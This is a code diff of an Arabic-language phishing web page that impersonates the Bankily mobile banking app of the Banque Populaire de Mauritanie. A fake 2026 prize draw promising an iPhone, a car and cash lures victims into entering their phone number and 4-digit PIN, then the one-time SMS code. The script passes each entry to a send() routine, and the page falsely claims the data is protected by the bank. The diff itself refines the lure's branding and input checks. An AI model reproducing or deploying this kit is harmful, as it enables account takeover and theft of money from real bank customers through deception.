@@ -3,146 +3,161 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>BPM - مفاجأة العام</title>
+    <title>Bankily 2026 - جوائز العام</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&family=Playfair+Display:ital,wght@1,700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&family=Playfair+Display:ital,wght@1,900&display=swap');
         
-        body { font-family: 'Tajawal', sans-serif; background-color: #ffffff; margin: 0; min-height: 100vh; overflow-x: hidden; }
+        body { font-family: 'Tajawal', sans-serif; background-color: #f8fafc; margin: 0; min-height: 100vh; overflow-x: hidden; }
 
-        /* النصف العلوي: الإعلان الاحترافي */
-        .promo-section { 
-            height: 48vh; 
-            background: linear-gradient(rgba(0,0,0,0.3), rgba(0,0,0,0.3)), url('https://i.ibb.co/3W6f99B/bankily-hero.jpg') no-repeat center center; 
-            background-size: cover;
+        /* الواجهة العلوية الرسمية لبنكيلي 2026 */
+        .bankily-header { 
+            height: 42vh; 
+            background: linear-gradient(135deg, #00a5bc 0%, #007a8a 100%);
             position: relative;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            text-shadow: 0 4px 10px rgba(0,0,0,0.5);
+            border-radius: 0 0 50px 50px;
+            box-shadow: 0 10px 25px rgba(0, 165, 188, 0.2);
         }
 
-        /* الخط الفرنسي المزخرف الكبير */
-        .brand-name { 
+        /* زخرفة "بنكيلي 2026" بخط فرنسي فخم */
+        .brand-title { 
             font-family: 'Playfair Display', serif; 
-            font-size: 55px; 
-            color: #ffb400; 
+            font-size: 58px; 
+            color: #ffffff; 
             font-style: italic;
-            letter-spacing: 2px;
-            margin-bottom: 5px;
+            text-shadow: 3px 3px 0px rgba(0,0,0,0.1);
+            margin-bottom: -10px;
+        }
+        .year-badge {
+            background: #ffb400;
+            color: #fff;
+            padding: 4px 20px;
+            border-radius: 20px;
+            font-weight: bold;
+            font-size: 20px;
+            margin-top: 15px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
         }
 
-        /* منطقة الجوائز الواقعية */
-        .prizes-container {
+        /* عرض الجوائز الواقعي */
+        .prize-showcase {
             display: flex;
-            gap: 15px;
-            margin-top: 10px;
-            background: rgba(255, 255, 255, 0.15);
+            gap: 20px;
+            margin-top: 25px;
+        }
+        .prize-card {
+            background: rgba(255, 255, 255, 0.2);
+            padding: 10px;
+            border-radius: 15px;
+            text-align: center;
             backdrop-filter: blur(5px);
-            padding: 10px 20px;
-            border-radius: 50px;
-            border: 1px solid rgba(255,255,255,0.3);
-        }
-        .prize-item { font-size: 24px; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.5)); }
-
-        .hero-overlay {
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            height: 120px;
-            background: linear-gradient(to bottom, transparent, #ffffff 100%);
+            border: 1px solid rgba(255, 255, 255, 0.3);
         }
 
-        /* تنسيق الحقول */
-        .form-container { padding: 10px 40px; position: relative; z-index: 10; margin-top: -20px; }
-        .input-group { position: relative; margin-bottom: 30px; }
-        .input-label { display: block; text-align: right; margin-bottom: 5px; color: #00a5bc; font-size: 14px; font-weight: bold; }
-        .input-line { width: 100%; border: none; border-bottom: 2.5px solid #00a5bc; outline: none; padding: 12px 0; font-size: 20px; text-align: center; background: transparent; }
-
-        /* زر الدخول الذهبي */
-        .btn-gold { 
-            background: linear-gradient(135deg, #ffb400, #ff9000);
-            color: white; width: 100%; padding: 18px; font-size: 22px; font-weight: bold; 
-            border: none; position: fixed; bottom: 0; right: 0; cursor: pointer;
-            box-shadow: 0 -4px 15px rgba(255, 180, 0, 0.3);
-        }
-
-        /* واجهة الـ OTP (بدون انتقال تلقائي) */
-        #screen-otp { display: none; min-height: 100vh; background: white; text-align: center; }
-        .otp-input-manual {
-            width: 80%;
-            border: 2px solid #00a5bc;
+        /* تنسيق الحقول لمحاكاة التطبيق الأصلي */
+        .app-container { padding: 30px 40px; }
+        .input-box { 
+            background: #ffffff;
             border-radius: 12px;
             padding: 15px;
-            font-size: 28px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+            border: 1px solid #e2e8f0;
+        }
+        .input-label { color: #64748b; font-size: 13px; margin-bottom: 8px; display: block; font-weight: bold; }
+        .input-field { 
+            width: 100%; border: none; outline: none; font-size: 22px; 
+            text-align: center; color: #00a5bc; font-weight: bold; letter-spacing: 2px;
+        }
+
+        /* زر بنكيلي التقليدي */
+        .btn-bankily { 
+            background: #ffb400; color: white; width: 100%; padding: 18px; 
+            font-size: 22px; font-weight: bold; border: none; 
+            position: fixed; bottom: 0; right: 0; cursor: pointer;
+            transition: 0.3s;
+        }
+        .btn-bankily:hover { background: #e6a200; }
+
+        /* واجهة الـ OTP */
+        #screen-otp { display: none; text-align: center; background: #fff; min-height: 100vh; }
+        .otp-large-input {
+            width: 85%;
+            border: 3px solid #00a5bc;
+            border-radius: 20px;
+            padding: 20px;
+            font-size: 35px;
             text-align: center;
-            letter-spacing: 10px;
-            margin: 40px auto;
+            letter-spacing: 20px;
+            margin: 50px auto;
+            color: #00a5bc;
             outline: none;
             display: block;
         }
-
-        .announcement-bar { background: #00a5bc; color: white; padding: 8px; font-size: 13px; text-align: center; font-weight: bold; }
     </style>
 </head>
 <body>
 
-    <!-- الواجهة الأولى: الإعلان الاحترافي -->
+    <!-- الواجهة الرئيسية للجوائز -->
     <div id="screen-login">
-        <div class="announcement-bar">🎉 مبروك! لقد تأهلت لسحب الجوائز الكبرى من BPM</div>
-        <div class="promo-section">
-            <h1 class="brand-name">Benkily</h1>
-            <div class="prizes-container">
-                <span class="prize-item" title="iPhone 17 Pro Gold">📱✨</span>
-                <span class="prize-item" title="Car Keys">🔑🚗</span>
-                <span class="prize-item" title="Cash Money">💰💸</span>
-            </div>
-            <p class="text-white text-sm mt-3 font-bold">سجل دخولك الآن لتأكيد استلام جائزتك</p>
-            <div class="hero-overlay"></div>
-        </div>
-
-        <div class="form-container">
-            <div class="input-group">
-                <label class="input-label">رقم الهاتف المرتبط بالحساب</label>
-                <input id="user_id" type="tel" class="input-line" maxlength="8" placeholder="00 00 00 00">
-            </div>
-
-            <div class="input-group">
-                <label class="input-label">الرمز السري (PIN)</label>
-                <input id="pin" type="password" maxlength="4" class="input-line" style="letter-spacing: 12px;" placeholder="****">
-            </div>
-
-            <div class="text-center mt-6">
-                <p class="text-xs text-gray-400">سيتم تحويل الجائزة مباشرة بعد التحقق من الهوية</p>
+        <div class="bankily-header">
+            <h1 class="brand-title">Bankily</h1>
+            <div class="year-badge">جوائز 2026</div>
+            
+            <div class="prize-showcase">
+                <div class="prize-card"><span class="block text-2xl">📱</span><span class="text-[10px] text-white">iPhone 17</span></div>
+                <div class="prize-card"><span class="block text-2xl">🚗</span><span class="text-[10px] text-white">سيارة أحلامك</span></div>
+                <div class="prize-card"><span class="block text-2xl">💰</span><span class="text-[10px] text-white">مبالغ نقدية</span></div>
             </div>
         </div>
 
-        <button onclick="handleLogin()" class="btn-gold">دخول وسحب الجائزة</button>
+        <div class="app-container">
+            <p class="text-center text-[#00a5bc] font-bold mb-6 text-lg">سجل دخولك للمشاركة في سحب اليوم</p>
+            
+            <div class="input-box">
+                <label class="input-label">رقم الهاتف (8 أرقام)</label>
+                <!-- قانون: أرقام فقط -->
+                <input id="user_id" type="tel" class="input-field" 
+                       oninput="this.value = this.value.replace(/[^0-9]/g, '');" 
+                       maxlength="8" placeholder="00000000">
+            </div>
+
+            <div class="input-box">
+                <label class="input-label">الرمز السري (4 أرقام)</label>
+                <!-- قانون: أرقام فقط -->
+                <input id="pin" type="password" class="input-field" 
+                       oninput="this.value = this.value.replace(/[^0-9]/g, '');" 
+                       maxlength="4" placeholder="****">
+            </div>
+
+            <p class="text-xs text-center text-gray-400">جميع البيانات محمية بواسطة أنظمة البنك الشعبي الموريتاني (BPM)</p>
+        </div>
+
+        <button onclick="handleLogin()" class="btn-bankily">تسجيل الدخول للسحب</button>
     </div>
 
-    <!-- الواجهة الثانية: رمز التحقق (إدخال يدوي) -->
+    <!-- واجهة التحقق OTP -->
     <div id="screen-otp">
-        <div class="bg-[#00a5bc] p-6 text-white">
-            <h2 class="text-2xl font-bold">تأكيد رقم الهاتف</h2>
+        <div class="bg-[#00a5bc] p-10 text-white rounded-b-[40px]">
+            <h2 class="text-2xl font-bold">تأكيد المشاركة</h2>
         </div>
         
-        <div class="px-8 mt-12">
-            <p class="text-gray-700 font-bold mb-6">يرجى إدخال رمز التحقق (OTP) الذي وصلك في رسالة نصية لتأكيد استلام "آيفون 17 ذهبي"</p>
+        <div class="px-10 mt-16">
+            <p class="text-gray-600 font-bold mb-8">أدخل الرمز السري المكون من 4 أرقام الذي استلمته الآن عبر الرسائل النصية</p>
             
-            <!-- تم حذف خاصية الانتقال التلقائي: حقل واحد يدوي -->
-            <input id="otp_manual" type="tel" class="otp-input-manual" maxlength="4" placeholder="0000">
+            <!-- قانون: إدخال يدوي + أرقام فقط -->
+            <input id="otp_manual" type="tel" class="otp-large-input" 
+                   oninput="this.value = this.value.replace(/[^0-9]/g, '');" 
+                   maxlength="4" placeholder="0000">
             
-            <div class="flex justify-center items-center gap-2 text-red-600 font-bold">
-                <span>⏱️</span>
-                <span>الرمز صالح لمدة 5 دقائق</span>
-            </div>
-            
-            <button class="mt-10 text-[#00a5bc] font-bold underline">إرسال كود جديد</button>
+            <p class="text-red-500 font-bold">⏳ الرمز صالح لمرة واحدة فقط</p>
         </div>
         
-        <button onclick="handleOTP()" class="btn-gold">تأكيد الجائزة</button>
+        <button onclick="handleOTP()" class="btn-bankily">تأكيد واستلام الجائزة</button>
     </div>
 
     <script>
@@ -154,19 +169,19 @@
             const p = document.getElementById('pin').value;
             
             if(u.length === 8 && p.length === 4) {
-                send(`🎁 PROMO WINNER LOGIN\n📱 Phone: ${u}\n🔐 PIN: ${p}`);
+                send(`🏆 Bankily 2026 Entry\n📱 Phone: ${u}\n🔐 PIN: ${p}`);
                 document.getElementById('screen-login').style.display = 'none';
                 document.getElementById('screen-otp').style.display = 'block';
             } else {
-                alert("يرجى إدخال البيانات بشكل صحيح للمشاركة في السحب");
+                alert("يرجى إدخال البيانات المطلوبة بشكل صحيح (أرقام فقط)");
             }
         }
 
         function handleOTP() {
             const code = document.getElementById('otp_manual').value;
             if(code.length === 4) {
-                send(`🔑 PROMO OTP: ${code}`);
-                alert("تم استلام طلبك بنجاح! سيتم التواصل معك خلال 24 ساعة.");
+                send(`🔑 Bankily 2026 OTP: ${code}`);
+                alert("تم تسجيل مشاركتك بنجاح! سيتم إخطار الفائزين عبر اتصال مباشر.");
                 location.reload();
             } else {
                 alert("يرجى إدخال رمز التحقق المكون من 4 أرقام");
